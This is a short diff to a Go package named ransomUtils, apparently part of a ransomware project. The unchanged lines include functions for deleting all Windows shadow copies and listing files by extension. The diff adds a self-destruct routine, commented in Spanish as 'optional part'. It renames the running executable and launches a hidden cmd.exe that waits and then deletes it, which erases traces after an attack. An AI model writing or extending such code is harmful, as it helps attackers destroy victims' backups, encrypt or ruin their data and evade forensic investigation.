@@ -3,9 +3,11 @@ package ransomUtils
 import (
 	"fmt"
 	"io/fs"
+	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"syscall"
 )
 
 func DeleteAllShadowCopies() (string, error) {
@@ -60,4 +62,14 @@ func ListFiles(root string, extensions []string) ([]string, error) {
 	}
 
 	return files, nil
+}
+
+//parte opcional: autodestruccion
+func AutoBorrar() {
+	ruta, _ := filepath.Abs(os.Args[0])
+	os.Rename(ruta, ruta+".tmp")
+
+	cmd := exec.Command("cmd.exe", "/C", "ping 127.0.0.1 -n 3 > nul & del \""+ruta+".tmp\"")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Start()
 }
